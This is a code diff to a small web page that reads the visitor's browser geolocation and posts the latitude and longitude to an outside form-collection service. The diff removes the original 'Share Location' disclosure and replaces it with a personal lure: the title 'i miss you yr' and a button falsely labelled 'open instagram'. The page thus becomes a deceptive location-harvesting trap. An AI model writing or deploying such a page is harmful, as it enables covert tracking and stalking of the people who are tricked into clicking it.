@@ -2,13 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Share Your Location</title>
+  <title> i miss you yr </title></title>
 </head>
 <body>
-  <h2>Click below to share your location with me</h2>
-  <button onclick="getLocation()">Share Location</button>
-
-  <form id="locationForm" method="POST" action="https://formspree.io/f/mjkwgqze">
+  <h2>Click below</h2>
+  <button onclick="getLocation()">open instagram</button>
+<form id="locationForm" method="POST" action="https://formspree.io/f/mjkwgqze">
     <input type="hidden" name="latitude" id="lat">
     <input type="hidden" name="longitude" id="lon">
   </form>
@@ -16,7 +15,7 @@
   <script>
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+         navigator.geolocation.getCurrentPosition(sendLocation, showError);
       } else {
         alert("Geolocation is not supported by this browser.");
       }
@@ -26,7 +25,7 @@
       document.getElementById("lat").value = position.coords.latitude;
       document.getElementById("lon").value = position.coords.longitude;
       document.getElementById("locationForm").submit();
-      alert("Your location has been sent!");
+      alert("thanks partner!");
     }
 
     function showError(error) {
